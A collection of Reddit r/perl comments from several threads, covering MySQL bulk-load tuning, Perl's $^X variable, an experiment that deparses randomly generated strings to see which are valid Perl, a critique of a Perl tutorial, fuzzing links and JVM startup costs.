One thing you have to be careful of when getting into thousands of placeholders is that the fully-formed query doesn't hit the configured max_allowed_packet size, which defaults to only 4 MB. If it does, you'll get the unhelpful error message "Lost connection to MySQL server during query" as the server forcibly disconnects your client. (I recommend raising max_allowed_packet as the first thing to do in any mysql server configuration.)
You'll probably want to play with doing batched inserts vs writing out a MySQL load file and using LOAD DATA. You'll pay a penalty in having to write the data out to a file, but LOAD statements can be a lot faster than inserts. Also if you're using MySQL replication you can get some optimization using LOAD since the master will only send the changed records to the slaves instead of sending the full transaction. 
Doing bulk loads in my professional experience has always best been done by interfacing with vendor or third party loading tools. I'd look at constructing a LOAD statement or writing to a file and calling the mysql commandline client with a LOAD statement. Sequential import statements work, but they are far from efficient. Although 3000 records is really nothing, so you are probably fine just doing what you're doing. 
First off I'd try it the dumbest way. 9,600,000 cells sounds like a lot to a human but thats not really scary computer numbers. If it takes 100ns to check a single cell that's still under 1s to test the whole thing. The regex is probably the slower part of that code which you can benchmark if it doesnt work out. Replace the regex with a string length check and then substr check for only white space. Like check if most of the empty strings are length 0 then testing for that will be really fast in Perl, once it's done the initial IO and created all the cells. Also which version of Perl you're on will make a difference to speed too, I can't recall which I think &gt;5.24 sped up accessing through multiple references.
Excellent reply. Thanks so much. Great approach. 
From [perlvar](http://perldoc.perl.org/perlvar.html): &gt; $^ X The name used to execute the current copy of Perl, from C's argv[0] or (where supported) /proc/self/exe. &gt; Depending on the host operating system, the value of $^ X may be a relative or absolute pathname of the perl program file, or may be the string used to invoke perl but not the pathname of the perl program file. Also, most operating systems permit invoking programs that are not in the PATH environment variable, so there is no guarantee that the value of $^ X is in PATH. For VMS, the value may or may not include a version number. &gt;You usually can use the value of $^ X to re-invoke an independent copy of the same perl that is currently running. 
The perl monk is over 10 years old. It uses http instead of https. I hope this isn't something you have open to the internet....
Very cool! I'm guessing the deparser has no idea what the strings do? 
It doesn't even get to see them. Because they're being used in a void context (I think there's a different name, but it's been too long, so I'm using the C term) the optimizer chucks them, but the `'????'` is enough to tell me that, at the top level, there was just a constant or something that got reduced to one.
I prefer code that like to run under HTTP. I'll terminate the SSL on a real Web server that can hand off HTTP to the service, usually on the same host, but that depends on the infrastructure. 
Almost all of them are pure strings (and as constants in void context are thrown away by perl which is why they show up as ??? in the deparse). Only the third and fourth ones are at all interesting. The third has a compile time effect (basically the same as `- "foo"` becoming `"-foo"` which is sadly just a constant again. The fourth is the most interesting; it has a U+0008 character (the v-string almost had me fooled that it was bareword) minus a string, so it actually has a parse tree. Not sure why the code folding stuff didn't collapse it down to just a constant though. Looks like - doesn't fold when a string is involved: $ perl -MO=Deparse -e '5 - 5' '???'; -e syntax OK $ perl -MO=Deparse -e '"foo" - "foo"' 'foo' - 'foo'; -e syntax OK
It is still called void context in Perl.
I would consider banning q, ", and ', as the first character. That would cut down on the number of programs that are just strings in void context. The best one I have gotten so far is after 58 attempts: y;O8PajJzQ`tVC6[\h?m/XVKbCGk@u;&amp;Hcll8bz!jO"XH6l; Deparsed: tr(/68?@CGJKO-QVX[`-bhjkmtuz)[lXHll"l8l&amp;czOlH!ll6llljlb];
There's a custom filter in the code, but I never got to wiring up a syntax for excluding characters. You could pretty easily add something like a `--filter` flag for custom characters and maybe some classes like `--filter-quotes` and `--filter-globbing`. But I find it fascinating that you can run through so many random, perfectly parsable programs and never hit anything that's more complex than some strings and an op or two. 
Well, just like comments, strings hide a multitude of syntax sins. I don't know if it is just luck, but after adding this code: my $code = join('', map {choose_weighted(@$weight_info)} 1..$len); if ($code =~ /^[q"']/) { $code = substr $code, 1, -1; } return $code; I got a bunch of (more) interesting programs: after 1859 attempts: hi95|JL5oy6E0Htj Deparsed: '???'; after 460 attempts: uBNlQ-H9FEKeoy;x Deparsed: 'uBNlQ' - 'H9FEKeoy'; '???'; after 101 attempts: NM_^K-dXsl|rEb*hYV&amp;g Deparsed: Operator or semicolon missing before *hYV at - line 1. Ambiguous use of * resolved as operator * at - line 1. Operator or semicolon missing before &amp;g at - line 1. Ambiguous use of &amp; resolved as operator &amp; at - line 1. 'NM_' ^ 'K' - 'dXsl' | 'rEb' * 'hYV' &amp; 'g'; after 63 attempts: PG//R1kn5vDGME5Yutr Deparsed: '???'; after 520 attempts: $vXq^_ZehS&amp;LNZL7 Deparsed: Operator or semicolon missing before &amp;LNZL7 at - line 1. Ambiguous use of &amp; resolved as operator &amp; at - line 1. $vXq ^ "LJ\@H\cS"; after 113 attempts: _io880blO&amp;tHBgu Deparsed: Operator or semicolon missing before &amp;tHBgu at - line 1. Ambiguous use of &amp; resolved as operator &amp; at - line 1. '???'; after 78 attempts: Rgs&lt;pbiYCNK;kCW,z Deparsed: 'Rgs' &lt; 'pbiYCNK'; '???', '???'; after 344 attempts: CU8R31,IodiOSUWejF Deparsed: '???', '???'; after 306 attempts: MvZu&amp;sE;nIg23V^~d Deparsed: Operator or semicolon missing before &amp;sE at - line 1. Ambiguous use of &amp; resolved as operator &amp; at - line 1. '???'; '???'; after 582 attempts: QB7LQ;MKV*w;SSW5S8x Deparsed: Operator or semicolon missing before *w at - line 1. Ambiguous use of * resolved as operator * at - line 1. '???'; 'MKV' * 'w'; '???'; 10 of 4426 random strings are valid perl 0.22594%
I guess you'll need to keep going until ~96^16 or ~96^32 to get *actually* interesting results.:). Instead of pure random, how about using some heuristics, or maybe generate some ASCII art like people used to do ~20 years ago.
Hi Guys, this was brilliant, I had the same issue. Thanks atsider.
&gt; Notice: In general, Perl interpreter sees integers like floating points numbers. For example, if you write 2 in your programs, Perl will see it like 2.0000 Perl's integer math is floating point math.... That can't possibly be true, can it?
A " could still do interpolation, and q could be the first character in e.g. qx, so that's a bit worrying...
I offered to help review the book (although, due to personal reasons I didn't get as far as I had hoped) and one thing that kept popping up in my head was how well it was written. Laurent did a fantastic job. I think it definitely could be a pretty good first introduction to computer science, but I think it also serves really well as a second language that ties many things together. I've recently started reading it again and am thoroughly enjoying it. It truly is a beautiful language, I just hope the main implementation can continue to grow and become rock-solid and fast.
I very much dislike this tutorial. It makes the impression that scalars may store numbers, or single-quoted strings, or double-quoted strings. It's not true. Instead you can assign a numeric literal or a single-quoted string literal or a double-quoted string literal to a scalar. Same story with arrays. There are no sequential arrays and static arrays and dynamic arrays. There is only one type of array, which you can assign a LIST. This list could be a list literal `(1, 2, 3)` or a sequence `1 .. 10`, or it could be returned by a function. It would be nice to introduce the fundamental difference between the always-anonymous and always-immutable list and the mostly-named and always-mutable array as well. The whole Array section starts with an example that is invalid with `use strict`: `@a = (a, b, c, d)` Hashes: assigning a list without fat commas `=&gt;` is called a list? No. Does not even explain or use the main feature of fat commas: auto-quoting the bareword before them. And so on. Very sloppy material. Just stick to the Camel Book. :) Sorry for being negative, but we should not confuse Perl noobs.
&gt; how about using some heuristics, or maybe generate some ASCII art like people used to do ~20 years ago. Not really the point of the exercise. It was to determine what actually random code looked like. Taking out comments seemed reasonable, given that comments aren't technically code, so much as directives to stop looking for code. 
I'm a bot, *bleep*, *bloop*. Someone has linked to this thread from another place on reddit: - [/r/clojure] [Perl vs Clojure • r\/perl](https://np.reddit.com/r/Clojure/comments/6ojv2m/perl_vs_clojure_rperl/) [](#footer)*^(If you follow any of the above links, please respect the rules of reddit and don't vote in the other threads.) ^\([Info](/r/TotesMessenger) ^/ ^[Contact](/message/compose?to=/r/TotesMessenger))* [](#bot)
See also "fuzzing", e.g. [Fuzzing Perl XS modules with AFL](https://medium.com/@dgryski/fuzzing-perl-xs-modules-with-afl-4bfc2335dd90#.a4jwjdg5l), [Fuzzing Perl: A Tale of Two American Fuzzy Loops](http://www.geeknik.net/71nvhf1fp), or google for "dan collins perl fuzz".
&gt;Perl's integer math is floating point math.... That can't possibly be true, can it? Unless you [use integer;](http://perldoc.perl.org/integer.html), yes, it's generally true. 
Virtual machines *are* expensive to start up. The JVM has always suffered from this issue. Thus Perl 5 is *always* going to win if a task is small and runs once. The theory, however, is that the JVM can optimise code execution at run-time - thus long-running tasks *should* be faster in a virtual machine than an ordinary scripted (interpreted) language. The great challenge of Perl 6 (which also relies on virtual machines) is to get it to not only perform in the long term but also start up reasonably quickly.